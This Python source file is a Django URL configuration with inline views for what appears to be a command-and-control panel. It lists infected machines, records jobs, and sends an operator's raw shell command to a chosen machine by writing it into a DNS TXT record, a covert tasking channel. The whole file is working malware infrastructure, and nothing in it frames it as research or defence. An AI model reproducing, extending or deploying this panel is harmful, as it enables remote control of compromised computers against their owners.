"""
URL configuration for djangoproject project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/6.0/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.conf import settings
from django.http import HttpRequest
from django.shortcuts import render, redirect
# from django.contrib import admin
from django.urls import include, path
from django.views.decorators.http import require_POST

from .models import InfectedMachine, Job
from .services.DnsService import DnsService


def index(request: HttpRequest):
    return render(request, "index.html", {
        "machinesCount": InfectedMachine.objects.count(),
        "jobsCount": Job.objects.count(),
    })

def machines(request: HttpRequest):
    return render(request, "machines.html", {
        "machines": InfectedMachine.objects.order_by('-created_at').all(),
    })

def jobs(request: HttpRequest):
    if request.GET.get('machine_id'):
        jobs = Job.objects.filter(infected_machine=request.GET.get('machine_id')).order_by('-created_at').all()
    else:
        jobs = Job.objects.order_by('-created_at').all()

    return render(request, "jobs.html", {
        "jobs": jobs,
    })

@require_POST
def job_create(request: HttpRequest, machine_id: int):
    machine = InfectedMachine.objects.filter(id=machine_id).first()
    raw_command = request.POST.get('command')
    if machine is None or raw_command is None or machine.get_current_job() is not None:
        return redirect('machines')

    new_job = machine.job_set.create()
    new_job.raw_command = raw_command
    new_job.save()

    DnsService().set_job_txt(machine, raw_command).apply()

    return redirect('machines')

@require_POST
def job_delete(_: HttpRequest, job_id: int):
    machine = Job.objects.filter(id=job_id).first()
    if machine is not None:
        machine.delete()

    return redirect('jobs')

urlpatterns = [
    #    path('admin/', admin.site.urls),
    path('', index, name='index'),
    path('machines', machines, name='machines'),
    path('jobs', jobs, name='jobs'),
    path('job/create/<int:machine_id>', job_create, name='job_create'),
    path('job/delete/<int:job_id>', job_delete, name='job_delete'),
]
if settings.DEBUG:
    # Include django_browser_reload URLs only in DEBUG mode
    urlpatterns += [
        path("__reload__/", include("django_browser_reload.urls")),
    ]
